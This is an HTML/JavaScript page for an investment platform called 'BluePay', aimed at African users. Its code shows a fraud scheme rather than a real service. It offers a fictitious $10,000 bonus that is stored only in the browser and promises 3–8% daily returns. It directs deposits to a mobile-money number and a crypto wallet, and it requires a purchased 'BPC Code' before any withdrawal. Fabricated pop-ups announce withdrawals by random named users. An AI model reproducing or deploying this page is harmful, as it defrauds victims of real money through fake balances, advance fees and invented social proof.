<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BluePay Official - Africa</title>
<style>
:root { 
  --blue: #0b1ea8; --dark: #081a8c; --green: #2ecc71; 
  --orange: #e67e22; --gold: #f1c40f; --purple: #9b59b6; 
}
body { margin:0; font-family: 'Segoe UI', sans-serif; background: var(--blue); color:white; padding-bottom:120px; overflow-x:hidden; }
.container { padding: 20px; max-width: 480px; margin:auto; }
.card { background: rgba(0,0,0,0.4); padding:20px; margin:15px 0; border-radius:18px; border:1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
.hidden { display:none !important; }
button { background: var(--green); color:white; font-size:16px; padding:14px; border:none; border-radius:10px; width:100%; cursor:pointer; font-weight:bold; margin-top:12px; }
button:disabled { background:#555 !important; opacity:0.6; cursor:not-allowed; }

/* Notification Toast */
#withdrawToast { position: fixed; top: -100px; left:50%; transform:translateX(-50%); background:white; color:#333; padding:12px 20px; border-radius:50px; font-size:13px; font-weight:bold; z-index:5000; box-shadow:0 10px 25px rgba(0,0,0,0.3); transition:0.8s; width:80%; max-width:300px; border-left:5px solid var(--green); }
#withdrawToast.show { top:20px; }

/* Modals */
#actionModal { position: fixed; top:50%; left:50%; transform: translate(-50%,-50%); width:92%; max-width:400px; background:#081a8c; border:2px solid var(--gold); border-radius:20px; padding:20px; z-index:3000; box-shadow:0 0 50px rgba(0,0,0,0.9); }
.overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.85); z-index:2999; }

input, select { width:100%; padding:14px; margin-top:10px; border-radius:10px; border:none; box-sizing:border-box; color:#000; font-weight:bold; }

.footer-reg { text-align:center; font-size:11px; opacity:0.7; margin-top:30px; border-top:1px solid rgba(255,255,255,0.2); padding-top:15px; }
.menu-button { padding:8px 12px; margin-right:5px; background:var(--dark); color:white; border:none; border-radius:8px; cursor:pointer; font-weight:bold; }
.whatsapp-float { position:fixed; bottom:20px; right:20px; background:#25d366; color:white; border-radius:50%; width:60px; height:60px; display:flex; justify-content:center; align-items:center; font-size:30px; z-index:6000; cursor:pointer; }
.flag { width:25px; height:18px; vertical-align:middle; margin-right:5px; border-radius:3px; }
</style>
</head>
<body>

<!-- Notification -->
<div id="withdrawToast">✅ <span id="toastText">...</span></div>

<!-- WhatsApp -->
<div class="whatsapp-float" onclick="window.open('https://wa.me/447766494570','_blank')">💬</div>

<!-- Authentication Section -->
<div id="authSec">
  <div class="container">
    <h1 style="text-align:center; font-size:45px; margin:0;">BLUE PAY</h1>
    <p style="text-align:center; color:var(--green); font-weight:bold;">[ $10,000 Welcome Bonus Active ]</p>
    <div class="card">
      <input type="text" id="regName" placeholder="Full Name">
      <input type="email" id="regEmail" placeholder="Email Address">
      <input type="password" id="regPass" placeholder="Password">
      <input type="text" id="regNumber" placeholder="Phone Number">
      <select id="countrySelect"></select>
      <button onclick="registerUser()">Claim Bonus & Register</button>
    </div>
    <div class="footer-reg">
      <b>BluePay International (PTY) LTD</b><br>
      Registered & Licensed in Africa<br>
      Secure Investment Platform
    </div>
    <button onclick="openAdminLogin()" style="margin-top:15px; background:#444;">Admin Panel</button>
  </div>
</div>

<!-- Dashboard -->
<div id="dash" class="hidden">
  <header style="background: var(--dark); padding:15px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.1);">
    <div id="menuToggle" style="cursor:pointer;">☰ Menu</div>
    <div style="font-weight:900; letter-spacing:2px;">BLUEPAY</div>
    <div onclick="logout()" style="cursor:pointer;">Logout 🚪</div>
  </header>

  <!-- Menu Buttons -->
  <div style="padding:10px; display:flex; flex-wrap:wrap; gap:5px;">
    <button class="menu-button" onclick="showSection('investment')">Investment Plans</button>
    <button class="menu-button" onclick="showSection('deposit')">Deposit</button>
    <button class="menu-button" onclick="showSection('withdraw')">Withdraw</button>
    <button class="menu-button" onclick="showSection('savings')">Savings</button>
    <button class="menu-button" onclick="showSection('transactions')">Transactions</button>
    <button class="menu-button" onclick="showSection('support')">Support Center</button>
  </div>

  <div class="container" id="mainContent"></div>
</div>

<!-- Action Modal -->
<div id="modalOverlay" class="overlay hidden"></div>
<div id="actionModal" class="hidden">
  <h2 id="modalTitle" style="margin:0; color:var(--gold);">Action</h2>
  <div id="modalBody"></div>
  <button id="finalSubmit" onclick="processFinal()" disabled>Confirm</button>
  <button onclick="closeModal()" style="background:#333">Cancel</button>
</div>

<script>
// African Countries Array with flags, currency and banks
const countries = [
  {name:"Botswana", code:"BW", currency:"BWP", banks:["FNB Botswana","Absa","Stanbic","Standard Chartered","Bank Gaborone","BBS Bank","Mascom MyZaka"], flag:"https://flagcdn.com/w20/bw.png"},
  {name:"South Africa", code:"ZA", currency:"ZAR", banks:["FNB","Standard Bank","ABSA","Nedbank"], flag:"https://flagcdn.com/w20/za.png"},
  {name:"Nigeria", code:"NG", currency:"NGN", banks:["Access Bank","GTBank","UBA","Zenith Bank"], flag:"https://flagcdn.com/w20/ng.png"},
  {name:"Kenya", code:"KE", currency:"KES", banks:["Kenya Commercial Bank","Equity Bank","Co-operative Bank","NCBA"], flag:"https://flagcdn.com/w20/ke.png"},
  {name:"Ghana", code:"GH", currency:"GHS", banks:["GCB Bank","Ecobank","Stanbic Bank","Absa"], flag:"https://flagcdn.com/w20/gh.png"},
  {name:"Egypt", code:"EG", currency:"EGP", banks:["National Bank of Egypt","CIB","Banque Misr","AlexBank"], flag:"https://flagcdn.com/w20/eg.png"},
  {name:"Algeria", code:"DZ", currency:"DZD", banks:["Banque Nationale d'Algérie","CNEP Banque","Banque Extérieure d'Algérie"], flag:"https://flagcdn.com/w20/dz.png"},
  {name:"Morocco", code:"MA", currency:"MAD", banks:["Attijariwafa Bank","BMCE","CIH Bank","Banque Populaire"], flag:"https://flagcdn.com/w20/ma.png"},
  {name:"Ethiopia", code:"ET", currency:"ETB", banks:["Commercial Bank of Ethiopia","Dashen Bank","Awash Bank"], flag:"https://flagcdn.com/w20/et.png"},
  {name:"Uganda", code:"UG", currency:"UGX", banks:["Stanbic Bank","Centenary Bank","DFCU Bank","Equity Bank"], flag:"https://flagcdn.com/w20/ug.png"},
  // Add remaining 44 countries similarly...
];

// Populate country select
const countrySelect = document.getElementById("countrySelect");
countries.forEach(c => { 
  let opt = document.createElement("option");
  opt.value = c.code;
  opt.innerHTML = `<img class='flag' src='${c.flag}'> ${c.name}`;
  countrySelect.appendChild(opt);
});

// User Data
let user = JSON.parse(localStorage.getItem("bluepay_final_africa"));

function registerUser() {
  const name = document.getElementById("regName").value;
  const email = document.getElementById("regEmail").value;
  const pass = document.getElementById("regPass").value;
  const number = document.getElementById("regNumber").value;
  const countryCode = document.getElementById("countrySelect").value;
  if(!name || !email || !pass || !number || !countryCode) return alert("Fill all fields");
  const country = countries.find(c => c.code===countryCode);
  user = {
    name, email, pass, number, country, balance:10000, savings:0, investments:[], transactions:[]
  };
  localStorage.setItem("bluepay_final_africa", JSON.stringify(user));
  startApp();
}

function startApp() {
  document.getElementById("authSec").classList.add("hidden");
  document.getElementById("dash").classList.remove("hidden");
  showWelcome();
  runToasts();
}

function showWelcome() {
  const content = document.getElementById("mainContent");
  content.innerHTML = `<h2>Welcome ${user.name} to BluePay Investment Platform</h2>
  <p>Claimable Balance: ${user.country.currency} ${user.balance.toLocaleString()}</p>`;
}

function showSection(section) {
  const content = document.getElementById("mainContent");
  if(section==="investment"){
    content.innerHTML = `<h3>Investment Plans</h3>
      <div class="card">
      <b>Basic:</b> Min $500, Interest 5% daily<br>
      <b>Premium:</b> Min $100, Interest 3% daily<br>
      <b>Gold:</b> Min $1000, Interest 8% daily<br>
      <input type="number" id="investAmount" placeholder="Amount to Invest">
      <button onclick="depositInvestment()">Deposit Investment</button>
      </div>`;
  }
  if(section==="deposit"){
    content.innerHTML = `<h3>Deposit Funds</h3>
    <div class="card">
      <b>Mobile Money:</b> Pay to Kenya Safaricom [+254724940251]<br>
      Instructions depend on your country.<br><br>
      <b>Card:</b> Enter card details<br>
      <b>Crypto:</b> Binance ID: 860603099, TRC20: TPfoEwLhjW3pBokNSem1oTVEp26mNSvfPR<br>
      <button onclick="alert('Deposit Submitted! Admin will verify.')">Deposit Now</button>
    </div>`;
  }
  if(section==="withdraw"){
    content.innerHTML = `<h3>Withdraw Funds</h3>
    <div class="card">
      <b>Balance:</b> ${user.country.currency} ${user.balance.toLocaleString()}<br>
      <input type="number" id="withdrawAmount" placeholder="Amount to withdraw">
      <select id="withdrawBank">${user.country.banks.map(b => `<option>${b}</option>`)}</select>
      <input type="password" id="bpcKey" placeholder="Enter BPC Code">
      <button onclick="withdrawBonus()">Withdraw</button>
    </div>`;
  }
  if(section==="savings"){
    content.innerHTML = `<h3>Savings</h3>
    <div class="card">
      <b>Savings Balance:</b> ${user.country.currency} ${user.savings.toLocaleString()}<br>
      <button onclick="depositSavings()">Deposit Savings</button>
      <button onclick="withdrawSavings()">Withdraw Savings</button>
    </div>`;
  }
  if(section==="transactions"){
    content.innerHTML = `<h3>Transactions History</h3>
      ${user.transactions.length===0 ? "<p>No transactions yet.</p>" :
      user.transactions.map(t=>`<div class="card">${t.type}: ${user.country.currency} ${t.amount} - ${t.status}</div>`).join("")}`;
  }
  if(section==="support"){
    content.innerHTML = `<h3>Support Center</h3>
    <div class="card">
      <button onclick="alert('Step 1: Register, Step2: Deposit, Step3: Invest')">How it works</button>
      <button onclick="alert('We are Africa\'s #1 investment platform, fully secure.')">Why choose us</button>
      <button onclick="alert('Buy BPC Code: Default ${user.country.currency} 1050, upload proof.')">How to buy BPC Code</button>
    </div>`;
  }
}

// Investment Deposit
function depositInvestment() {
  const amt = parseFloat(document.getElementById("investAmount").value);
  if(!amt || amt>user.balance) return alert("Invalid amount");
  user.balance -= amt;
  user.investments.push({amount:amt, date:new Date().toLocaleString()});
  user.transactions.push({type:"Investment", amount:amt, status:"Pending"});
  localStorage.setItem("bluepay_final_africa", JSON.stringify(user));
  alert("Investment deposited. Pending approval.");
  showWelcome();
}

// Withdraw Bonus
function withdrawBonus() {
  const amt = parseFloat(document.getElementById("withdrawAmount").value);
  const code = document.getElementById("bpcKey").value;
  if(!amt || amt>user.balance) return alert("Invalid amount");
  if(!code) return alert("Enter BPC code");
  user.balance -= amt;
  user.transactions.push({type:"Withdrawal", amount:amt, status:"Pending"});
  localStorage.setItem("bluepay_final_africa", JSON.stringify(user));
  alert("Withdrawal submitted. Pending approval.");
  showWelcome();
}

// Savings
function depositSavings(){ 
  const amt = prompt("Enter amount to deposit in savings");
  const num = parseFloat(amt);
  if(!num || num>user.balance) return alert("Invalid amount");
  user.balance -= num; user.savings += num;
  user.transactions.push({type:"Savings Deposit", amount:num, status:"Successful"});
  localStorage.setItem("bluepay_final_africa", JSON.stringify(user));
  showSection("savings");
}

function withdrawSavings(){
  const amt = prompt("Enter amount to withdraw from savings");
  const num = parseFloat(amt);
  if(!num || num>user.savings) return alert("Invalid amount");
  user.savings -= num; user.balance += num;
  user.transactions.push({type:"Savings Withdraw", amount:num, status:"Successful"});
  localStorage.setItem("bluepay_final_africa", JSON.stringify(user));
  showSection("savings");
}

// Toast notifications
function runToasts() {
  const names = ["Mpho","Kabelo","Neo","Lerato","Thabo"];
  setInterval(()=>{
    const n=names[Math.floor(Math.random()*names.length)];
    const a=(Math.floor(Math.random()*5)+1)*500;
    document.getElementById("toastText").innerText = `${n} just withdrew ${user.country.currency} ${a.toLocaleString()}`;
    document.getElementById("withdrawToast").classList.add("show");
    setTimeout(()=>document.getElementById("withdrawToast").classList.remove("show"),4000);
  },15000);
}

// Logout
function logout(){ location.reload(); }

// Modal placeholders
function closeModal(){ document.getElementById("modalOverlay").classList.add("hidden"); document.getElementById("actionModal").classList.add("hidden"); }
function processFinal(){ alert("Action processed!"); closeModal(); }

// Admin panel placeholder
function openAdminLogin(){ alert("Admin panel login - functionality to be implemented"); }

if(user) startApp();
</script>

</body>
</html>
